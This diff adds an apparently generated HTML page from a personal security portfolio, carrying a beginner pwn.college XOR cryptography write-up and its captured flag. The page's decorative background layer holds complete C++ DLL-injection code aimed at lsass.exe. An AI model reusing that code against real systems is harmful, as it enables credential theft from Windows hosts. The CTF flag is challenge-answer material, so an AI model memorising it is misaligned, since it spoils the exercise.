@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧠 XOR 101 — Intro to Bitwise Crypto</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🧠 XOR 101 — Intro to Bitwise Crypto" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🧠 XOR 101 — Intro to Bitwise Crypto</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Challenge Title:</strong> XOR (Strangely enough…)<br />
+<strong>Platform:</strong> pwn.college<br />
+<strong>Category:</strong> Cryptography<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Tag:</strong> <code class="language-plaintext highlighter-rouge">bitwise</code>, <code class="language-plaintext highlighter-rouge">beginner</code>, <code class="language-plaintext highlighter-rouge">XOR</code>, <code class="language-plaintext highlighter-rouge">python</code></p>
+
+<hr />
+
+<h2 id="-description">📝 Description</h2>
+
+<p>Strangely enough, we’ll start our crypto journey with the humble <strong>Exclusive Or (XOR)</strong> operator.</p>
+
+<p>XOR is a <strong>bitwise</strong> operator — it compares <strong>each bit</strong> of two numbers and returns <code class="language-plaintext highlighter-rouge">1</code> if the bits are different, and <code class="language-plaintext highlighter-rouge">0</code> if they are the same.</p>
+
+<p>For example:<br />
+<code class="language-plaintext highlighter-rouge">9 (1001)</code> XOR <code class="language-plaintext highlighter-rouge">5 (0101)</code> = <code class="language-plaintext highlighter-rouge">1100</code> (which is 12 in decimal).</p>
+
+<p>What makes XOR useful in cryptography is that it is <strong>self-inverse</strong>:</p>
+
+<ul>
+  <li>If <code class="language-plaintext highlighter-rouge">A ^ B = C</code>, then <code class="language-plaintext highlighter-rouge">C ^ B = A</code>.</li>
+</ul>
+
+<p>This means if we XOR a message with a key to encrypt it, XORing it again with the same key will decrypt it.</p>
+
+<blockquote>
+  <p>In this level, you will learn to XOR!<br />
+We’ll give you a shared key, XOR a secret number with it, and expect you to recover the number.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-hint">💡 HINT</h2>
+
+<p>Use Python’s <code class="language-plaintext highlighter-rouge">^</code> operator to XOR integers.</p>
+
+<hr />
+
+<h2 id="-challenge-walkthrough">🧪 Challenge Walkthrough</h2>
+
+<p>Let’s understand this through an example session:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hacker@cryptography~xor:~<span class="nv">$ </span>python
+Python 3.12.11 <span class="o">(</span>main, Jun  3 2025, 15:41:47<span class="o">)</span> <span class="o">[</span>GCC 14.2.1 20250322] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> 250 ^ 143
+117
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">exit</span><span class="o">()</span>
+</code></pre></div></div>
+<p>We’re simply XORing two numbers. Now, let’s try solving the actual challenge:
+```hacker@cryptography~xor:~$ /challenge/run
+The key: 119
+Encrypted secret: 49
+Decrypted secret? 70
+CORRECT! Your flag:
+pwn.college{8i1<em>fbZRWfamOen__vOIWhimMl</em>.QX3IzN5wSM0IzMyEzW}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Decryption logic:
+Since Encrypted = Secret ^ Key, then
+Secret = Encrypted ^ Key
+=&gt; Secret = 49 ^ 119 = 70
+---
+## Flag
+</code></pre></div></div>
+<p>pwn.college{8i1<em>fbZRWfamOen__vOIWhimMl</em>.QX3IzN5wSM0IzMyEzW}
+```
+—</p>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
